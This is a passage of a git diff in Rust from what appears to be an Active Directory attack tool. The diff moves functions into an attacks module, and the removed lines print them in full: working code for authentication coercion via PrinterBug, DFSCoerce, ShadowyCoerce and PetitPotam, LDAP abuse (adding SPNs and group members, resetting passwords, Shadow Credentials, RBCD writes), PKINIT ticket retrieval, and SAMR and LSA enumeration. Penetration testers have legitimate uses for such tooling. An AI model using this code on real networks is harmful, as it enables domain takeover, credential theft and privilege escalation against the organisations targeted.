+// fn laps moved to attacks::laps in arch-0.
 
 /// Execute a command over WinRM (WS-Man). NTLM auth + MS-NLMP message encryption over 5985 —
 /// quieter than SVCCTL (no service-install event) and often the only lateral path left open.
@@ -2564,7 +2030,7 @@ async fn dnsenum(a: DnsArgs) -> Result<()> {
 }
 
 /// Extract the CurrentPassword bytes from an MSDS-MANAGEDPASSWORD_BLOB (MS-ADTS §2.2.19).
-fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
+pub(crate) fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
     if b.len() < 16 {
         return None;
     }
@@ -2580,326 +2046,14 @@ fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
     Some(pw.get(..256).unwrap_or(pw).to_vec())
 }
 
-/// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
-async fn coerce(mut a: CoerceArgs) -> Result<()> {
-    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
-    use smb2_client::SmbClient;
+// fn coerce moved to attacks::coerce in arch-0.
 
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-
-    match a.pipe {
-        CoercePipe::Spoolss => {
-            // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
-            use dcerpc::rprn::{printerbug_tcp, PrinterBug};
-            // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
-            let target = a.target.clone().unwrap_or_else(|| a.host.clone());
-            let via_pipe = match smb.open_pipe("spoolss").await {
-                Ok(pipe) => {
-                    let mut client = PrinterBug::bind(&mut smb, pipe).await?;
-                    Some(client.coerce(&target, &a.listener).await)
-                }
-                Err(_) => None,
-            };
-            let result = match via_pipe {
-                Some(r) => r,
-                None => {
-                    printerbug_tcp(
-                        &a.host,
-                        &a.domain,
-                        &a.user,
-                        &a.password,
-                        &target,
-                        &a.listener,
-                    )
-                    .await
-                }
-            };
-            match result {
-                Ok(status) => {
-                    println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
-                    println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
-                }
-                Err(e) => {
-                    println!(
-                        "[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}"
-                    )
-                }
-            }
-        }
-        CoercePipe::Netdfs => {
-            // MS-DFSNM (DFSCoerce): NetrDfsAddStdRoot over \netdfs — makes the DC auth to ServerName.
-            use dcerpc::dfsnm::CoerceClient as DfsClient;
-            let pipe = smb.open_pipe("netdfs").await?;
-            let mut client =
-                DfsClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                    .await?;
-            match client.coerce(&a.listener).await {
-                Ok(status) => {
-                    println!("[+] NetrDfsAddStdRoot accepted via \\netdfs — status {status:#010x}");
-                    println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
-                }
-                Err(e) => println!(
-                    "[-] DFSCoerce failed on this DC ({e}) — try `--pipe spoolss` (PrinterBug); netdfs is picky about transport/auth-level on modern Windows"
-                ),
-            }
-        }
-        CoercePipe::Fssagentrpc => {
-            // MS-FSRVP (ShadowyCoerce): IsPathSupported over \FssagentRpc — makes the VSS provider
-            // auth to ShareName. Needs the File Server VSS Agent Service enabled.
-            use dcerpc::fsrvp::CoerceClient as VssClient;
-            let pipe = smb.open_pipe("FssagentRpc").await?;
-            let mut client =
-                VssClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                    .await?;
-            match client.coerce(&a.listener).await {
-                Ok(status) => {
-                    println!("[+] IsPathSupported accepted via \\FssagentRpc — status {status:#010x}");
-                    println!("    {} VSS provider attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
-                }
-                Err(e) => println!(
-                    "[-] ShadowyCoerce failed ({e}) — needs FS-VSS-Agent role installed AND Backup Operators rights; try `--pipe spoolss` for a reliable alternative"
-                ),
-            }
-        }
-        CoercePipe::Lsarpc | CoercePipe::Efsrpc => {
-            // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
-            use dcerpc::efsr::CoerceClient;
-            let pipe_name = match a.pipe {
-                CoercePipe::Lsarpc => "lsarpc",
-                CoercePipe::Efsrpc => "efsrpc",
-                _ => unreachable!(),
-            };
-            let pipe = smb.open_pipe(pipe_name).await?;
-            let mut client =
-                CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                    .await?;
-            match client.coerce(&a.listener).await {
-                Ok(status) => {
-                    println!(
-                        "[+] EfsRpcOpenFileRaw accepted via \\{pipe_name} — status {status:#010x}"
-                    );
-                    println!(
-                        "    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
-                        a.host, a.listener
-                    );
-                }
-                Err(e) => println!(
-                    "[-] EFSR via \\{pipe_name} failed ({e}) — MS-EFSR is restricted/removed on Server 2016+ hardening; use `--pipe spoolss` (PrinterBug) instead"
-                ),
-            }
-        }
-    }
-    Ok(())
-}
-
-/// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
-async fn abuse(mut a: AbuseArgs) -> Result<()> {
-    // AbuseArgs.password is Option<String>; resolve through the same @file: / env /
-    // TTY-prompt cascade as every other subcommand. `resolve_secret` returns "" when
-    // nothing is available; downstream code turns that into a "needs --password" error
-    // for the actions that require one (pkinit branches on the key .pem instead).
-    {
-        let cur = a.password.as_deref().unwrap_or("");
-        let resolved = resolve_secret(cur, "ADHAMMER_PASSWORD")?;
-        if !resolved.is_empty() {
-            a.password = Some(resolved);
-        }
-    }
-    // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
-    if a.action == AbuseAction::Pkinit {
-        let realm = a.realm.clone().context("pkinit needs --realm")?;
-        let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
-        let key_path = if a.value.is_empty() {
-            format!("{}.key.pem", a.target)
-        } else {
-            a.value.clone()
-        };
-        let pem =
-            std::fs::read_to_string(&key_path).with_context(|| format!("read key {key_path}"))?;
-        let tgt =
-            adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
-        let cc_path = format!("{}.ccache", a.target);
-        std::fs::write(&cc_path, &tgt.ccache)?;
-        println!(
-            "[+] PKINIT succeeded — TGT for {}@{} (via {})",
-            a.target, realm, tgt.sname
-        );
-        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
-        println!("    ticket valid until {}", tgt.end_time);
-        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
-        return Ok(());
-    }
-
-    // add-keycred over raw LDAP-389 + NTLM SASL (no LDAPS) — also the relay code path.
-    if a.ldap389 {
-        let host = a.host.clone().context("--ldap389 needs --host")?;
-        let realm = a.realm.clone().context("--ldap389 needs --realm")?;
-        let user = a.user.clone().context("--ldap389 needs --user")?;
-        let password = a.password.clone().context("--ldap389 needs --password")?;
-        let bare = user
-            .split('@')
-            .next()
-            .unwrap_or(&user)
-            .rsplit('\\')
-            .next()
-            .unwrap_or(&user)
-            .to_string();
-        let base: String = realm
-            .split('.')
-            .map(|p| format!("DC={p}"))
-            .collect::<Vec<_>>()
-            .join(",");
-        let mut ld = adhammer_ldap::LdapClient::connect(&format!("{host}:389")).await?;
-        ld.bind_ntlm(&realm, &bare, &password, "ADHAMMER").await?;
-        let dn = ld.find_dn(&base, &a.target).await?;
-        let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
-        ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
-            .await?;
-        std::fs::write(format!("{}.key.pem", a.target), &kc.private_key_pem)?;
-        println!("[+] LDAP-389 (NTLM SASL) add-keycred on {dn}");
-        println!(
-            "    key saved to {}.key.pem — Phase 2: attack abuse --action pkinit --target {}",
-            a.target, a.target
-        );
-        return Ok(());
-    }
-
-    let cfg = LdapConfig {
-        url: a.url.clone().context("this action needs --url")?,
-        bind_dn: a.user.clone().context("this action needs --user")?,
-        password: a.password.clone().context("this action needs --password")?,
-        base_dn: None,
-        insecure: a.insecure,
-        gssapi: false,
-    };
-    let mut c = Collector::connect(&cfg).await?;
-    let target_dn = c.resolve_dn(&a.target).await?;
-
-    match a.action {
-        AbuseAction::AddSpn => {
-            c.add_value(&target_dn, "servicePrincipalName", &a.value)
-                .await?;
-            println!(
-                "[+] added SPN '{}' to {} — now Kerberoastable",
-                a.value, a.target
-            );
-        }
-        AbuseAction::AddMember => {
-            let member_dn = c.resolve_dn(&a.value).await?;
-            c.add_value(&target_dn, "member", &member_dn).await?;
-            println!("[+] added {} to group {}", a.value, a.target);
-        }
-        AbuseAction::SetPassword => {
-            // AD refuses `unicodePwd` writes on an unencrypted channel — save the user a
-            // WILL_NOT_PERFORM roundtrip by front-checking the URL and telling them why.
-            let url = a.url.as_deref().unwrap_or("");
-            if url.starts_with("ldap://") {
-                anyhow::bail!(
-                    "set-password requires an encrypted LDAP channel — use `ldaps://` \
-                     (add --insecure for self-signed) or --gssapi with SASL sealing. \
-                     Plain ldap:// will always fail with WILL_NOT_PERFORM (0x5003)."
-                );
-            }
-            c.set_password(&target_dn, &a.value).await?;
-            println!("[+] reset password of {}", a.target);
-        }
-        AbuseAction::AddKeycred => {
-            // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
-            let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
-            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary)
-                .await?;
-            let key_path = format!("{}.key.pem", a.target);
-            std::fs::write(&key_path, &kc.private_key_pem)?;
-            println!(
-                "[+] added Shadow Credential to {} — key saved to {key_path}",
-                a.target
-            );
-            println!(
-                "    (Phase 2: PKINIT with this key to obtain a TGT as {})",
-                a.target
-            );
-        }
-        AbuseAction::WriteRbcd => {
-            // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
-            let trustee = if a.value.starts_with("S-") {
-                adhammer_core::sid::Sid::parse(&a.value).context("bad SID")?
-            } else {
-                c.resolve_sid(&a.value).await?
-            };
-            let sd = windows_sddl::build_rbcd_sd(&trustee);
-            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd)
-                .await?;
-            println!(
-                "[+] wrote RBCD on {} allowing {} to impersonate to it",
-                a.target, a.value
-            );
-        }
-        AbuseAction::Pkinit => unreachable!("pkinit handled above the LDAP-connect block"),
-    }
-    Ok(())
-}
+// fn abuse moved to attacks::abuse in arch-0.
 
 // fn spray moved to `attacks::spray` in arch-0.
-/// LSAT name→SID over \lsarpc (SMB2 → NTLM → DCE/RPC → LsarOpenPolicy2 → LsarLookupNames).
-async fn lsa(a: LsaArgs) -> Result<()> {
-    use dcerpc::lsat::LsatClient;
-    use smb2_client::SmbClient;
+// fn lsa moved to attacks::lsa in arch-0.
 
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb_login(
-        &mut smb,
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.nt_hash,
-    )
-    .await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let pipe = smb.open_pipe("lsarpc").await?;
-
-    let mut client = LsatClient::bind(&mut smb, pipe).await?;
-    let policy = client.open_policy().await?;
-    match client.lookup_name(&policy, &a.name).await? {
-        Some(sid) => println!("{} => {sid}", a.name),
-        None => println!("{} => (not mapped)", a.name),
-    }
-    Ok(())
-}
-
-/// Full path: SMB2 negotiate → NTLM session → IPC$ → \samr pipe →
-/// DCE/RPC bind → SamrConnect → enumerate domain users.
-async fn samr(a: SamrArgs) -> Result<()> {
-    use dcerpc::samr::SamrClient;
-    use smb2_client::SmbClient;
-
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb_login(
-        &mut smb,
-        &a.host,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.nt_hash,
-    )
-    .await?;
-    tracing::info!("SMB session established");
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let pipe = smb.open_pipe("samr").await?;
-    tracing::info!("\\samr pipe open");
-
-    let mut client = SamrClient::bind(&mut smb, pipe).await?;
-    let users = client
-        .enumerate_all_users(&format!("\\\\{}", a.host))
-        .await?;
-    println!("== SAMR users ({}) ==", users.len());
-    for (rid, name) in users {
-        println!("  {rid}\t{name}");
-    }
-    Ok(())
-}
+// fn samr moved to attacks::samr in arch-0.
 
 /// Common service ports scanned by the network sweep (FTP → RDP and the rest of the estate).
 const SERVICES: &[(u16, &str)] = &[
@@ -4698,47 +3852,7 @@ async fn scan(a: ScanArgs) -> Result<()> {
 
 // fn badsuccessor moved to `attacks::badsuccessor` in arch-0.
 // fn esc4 moved to `attacks::esc4` in arch-0.
-/// `attack shadowcred` — thin, top-level command for Shadow Credentials. Under the hood this
-/// is `attack abuse --action add-keycred` (and, with `--pkinit`, `--action pkinit`).
-async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
-    // Phase 1: plant the KeyCredential.
-    abuse(AbuseArgs {
-        url: Some(a.url.clone()),
-        user: Some(a.user.clone()),
-        password: Some(a.password.clone()),
-        insecure: a.insecure,
-        action: AbuseAction::AddKeycred,
-        target: a.target.clone(),
-        value: String::new(),
-        kdc: a.kdc.clone(),
-        realm: a.realm.clone(),
-        ldap389: false,
-        host: None,
-    })
-    .await?;
-    if a.pkinit {
-        let (kdc, realm) = match (a.kdc.as_ref(), a.realm.as_ref()) {
-            (Some(k), Some(r)) => (k.clone(), r.clone()),
-            _ => anyhow::bail!("--pkinit needs both --kdc and --realm"),
-        };
-        // Phase 2: PKINIT with the freshly-planted key to obtain a TGT as the target.
-        abuse(AbuseArgs {
-            url: Some(a.url),
-            user: Some(a.user),
-            password: Some(a.password),
-            insecure: a.insecure,
-            action: AbuseAction::Pkinit,
-            target: a.target,
-            value: String::new(),
-            kdc: Some(kdc),
-            realm: Some(realm),
-            ldap389: false,
-            host: None,
-        })
-        .await?;
-    }
-    Ok(())
-}
+// fn shadowcred moved to attacks::shadowcred in arch-0.
 
 /// `attack dcshadow` — enumerate accounts that already hold DCSync replication rights
 /// (Replicating Directory Changes All / In Filtered Set / Get Changes). Every principal on
@@ -4858,7 +3972,7 @@ async fn dump_laps(a: DumpLapsArgs) -> Result<()> {
          `adhammer_collector::sources::gkdi` for callers who want the library primitive."
     );
     let _ = a.dc; // reserved for the ms-gkdi path
-    laps(LapsArgs {
+    attacks::laps::laps(attacks::laps::LapsArgs {
         target: a.target,
         url: a.url,
         user: a.user,
@@ -4877,7 +3991,7 @@ async fn dump_gmsa(a: DumpGmsaArgs) -> Result<()> {
         "[!] `dump gmsa` is DEPRECATED and will be removed in 1.5.0 — use `attack gmsa` (same \
          functionality, one command per capability)."
     );
-    gmsa(GmsaArgs {
+    attacks::gmsa::gmsa(attacks::gmsa::GmsaArgs {
         url: a.url,
         user: a.user,
         password: a.password,
